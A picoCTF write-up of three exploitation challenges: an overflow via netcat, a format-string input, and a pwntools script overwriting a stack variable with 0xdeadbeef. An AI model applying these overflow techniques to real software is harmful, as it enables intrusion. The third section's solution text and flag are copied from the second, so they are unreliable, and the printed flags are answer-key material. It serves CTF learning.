# 1. buffer overflow 0

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Additional details will be available after launching your challenge instance.

## Solution:

Here, as the name suggests, we need to overflow. In the code, the size of the array was 16. So I first opened my Ubuntu and entered 'nc saturn.picoctf.net 60751' and input anything more than 16. I then got the flag.

```
ayush@LAPTOP-FR2LS0D1:~$ nc saturn.picoctf.net 60751
Input: aabbccddeeffgghhii
The program will exit now

ayush@LAPTOP-FR2LS0D1:~$ nc saturn.picoctf.net 60751
Input: iiiiiiiiiiiiiiiiiiii
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:

- I have learnt the concept of overflow and its correct usage to retrieve the flag.

## Resources:

play.picoctf.org


# 2. format string 0

Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 56467

## Solution:

Here in this challenge, we deal with format specifiers. I first executed nc mimas.picoctf.net 56467 in ubuntu. I then chose the options with specific format specifiers to retrieve the flags. We could also do trial and error to retrieve the flag.

```
ayush@LAPTOP-FR2LS0D1:~$ nc mimas.picoctf.net 58233
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Concepts learnt:

- I have learnt the use of format specifiers.

## Resources:

play.picoctf.org

# 3. clutter-overflow

Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:

Here in this challenge, we deal with format specifiers. I first executed nc mimas.picoctf.net 56467 in ubuntu. I then chose the options with specific format specifiers to retrieve the flags. We could also do trial and error to retrieve the flag.

```
My room is so cluttered...
What do you see?
123456
code == 0x0
code != 0xdeadbeef :(

My room is so cluttered...
What do you see?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaqwert
code == 0x7472657771
code != 0xdeadbeef :(

from pwn import *

nc_connection = remote('mars.picoctf.net', 31890)

limit = b'A' * 264
value_code = p64(0xdeadbeef)
final_input = limit + value_code

log.info("Receiving information")
nc_connection.recvuntil(b'What do you see?')

log.info("Sending the input")
nc_connection.sendline(final_input)

log.success("output sent.")
nc_connection.interactive()
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Concepts learnt:

so one of the main vulnerabilities in this file is the gets commands which takes the input of the clutter and even in the manual of gets the biggest bug is that it takes more input than the required or designed size and can lead to overflow so first i try out by typing random characters and the code always prints out 0 as initiated.
so to understand this more i tried exploring stack as it was one aspect (more in concepts) where the variables are stored so first code is initiated so the bottom part goes to code of 8 bytes followed by the character array clutter which holds 256 bytes and when we input more than 256 bytes like seen in the terminal prompt below the code value is the value of characters of ascii converted to hexa decimal in the reverse order so now our goal is to use this and make the value of code equal to deadbeef.
so now at first i typed out 256 a's and saw that the python code value returned 0 and the same happend for 264 characters as a well so then after some searching i searched up learn about some form of cover which is of 8 bytes and when i typed 264 a's and random characters and observed that the ascii value of the characters was converted to hex and printed in the reverse order but for us to make code equal to deadbeaf.
i spent researching about pwn tools and understood they are tools that are used in ctfs so then i prepared a script using resources where i read the message printed by the server and then sent an input which consists of 264 a's and then deadbeef encoded in the raw byte form which eventually prints the flag.

## Resources:

play.picoctf.org




